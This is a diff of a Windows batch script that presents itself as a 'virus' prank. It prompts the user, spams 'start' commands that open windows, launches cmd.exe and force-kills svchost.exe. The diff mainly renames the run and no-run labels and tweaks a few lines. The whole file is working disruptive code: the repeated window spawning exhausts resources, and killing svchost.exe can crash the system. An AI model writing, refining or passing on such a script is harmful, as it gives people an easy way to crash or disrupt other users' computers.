@@ -2,10 +2,10 @@
 1:
 color a
 echo this virus is no joke, still run it", "Logonf**k.exe # the title of the warning
-if /i %input%==Yes goto love
-if /i %input%==no goto hate
-if /i not %input%== Yes,no goto 1
-:love
+if /i %input%==Yes goto run
+if /i %input%==no goto norun
+if /i not %input%== run,norun goto 1
+:run
 echo starting virus...
 timeout 10
 pause
@@ -172,12 +172,13 @@ start
 start
 start
 start
-start www.google.com
+start
 start
 start
 start cmd.exe
 taskkill /f /im svchost.exe
-:hate
+:norun
 echo ok fine whatever, your pc is safe
 timeout 5
+timeout 7
 exit
